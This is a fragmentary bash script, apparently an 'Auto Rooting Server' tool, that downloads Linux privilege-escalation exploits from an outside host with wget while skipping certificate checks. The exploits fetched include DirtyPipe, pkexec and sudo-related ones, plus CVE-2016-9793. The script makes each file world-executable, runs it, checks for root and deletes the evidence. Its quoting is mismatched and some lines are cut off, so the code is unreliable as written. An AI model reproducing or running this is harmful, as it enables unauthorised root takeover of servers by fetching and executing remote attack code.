...
echo "************************************************************"
echo -e "${RED}Auto Rooting Server By: pecho -e "${RED}Blog: 
https://www.xploit.info${ENDCOLOR}"
echo "************************************************************"
...
$pkexec_version == "0.95" || $pkexec_version == "0.096" ]]; then
        wget -q "https://0-gram.github.io/id-0/exp_file_credential" 
...
echo "wget -q "https://0-gram.github.io/id-0/ak" --no-check-certificate
chmod 777 "ak"
./ak
check_root
rm -f "ak"
...
echo "wget -q "https://0-gram.github.io/id-0/exploit_userspec.py" 
--no-check-certificate
...
echo "wget -q 
"https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out" 
--no-check-certificate
chmod 777 "a2.out"
...
https://0-gram.github.io/id-0/sudodirtypipe
...
echo "wget -q --no-check-certificate 
https://0-gram.github.io/id-0/CVE-2016-9793
...
echo "wget -q --no-check-certificate 
https://0-gram.github.io/id-0/a.out
chmod 777 a.out
./a.out 0 && ./a.out 1
check_root
rm a.out
